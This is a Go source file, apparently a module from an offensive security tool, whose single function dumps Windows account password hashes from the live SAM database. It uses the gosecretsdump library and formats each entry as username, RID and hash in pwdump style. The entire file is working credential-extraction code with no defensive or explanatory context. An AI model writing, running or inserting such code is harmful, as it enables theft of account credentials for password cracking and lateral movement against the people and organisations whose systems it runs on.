package hashdump

import (
	"fmt"
	"strings"
	"sync"

	"github.com/lesnuages/gosecretsdump/pkg/samreader"
)

func Hashdump() (string, error) {
	var outData strings.Builder
	liveSamReader, err := samreader.NewLive()
	if err != nil {
		return "", err
	}
	wg := &sync.WaitGroup{}
	wg.Add(1)
	go func() {
		defer wg.Done()
		for dh := range liveSamReader.GetOutChan() {
			if dh.Username != "" {
				outData.WriteString(fmt.Sprintf("%s:%d:%s::\n", dh.Username, dh.Rid, dh.HashString()))
			}
		}
	}()
	if samErr := liveSamReader.Dump(); samErr != nil {
		return "", samErr
	}
	wg.Wait()
	return outData.String(), err
}
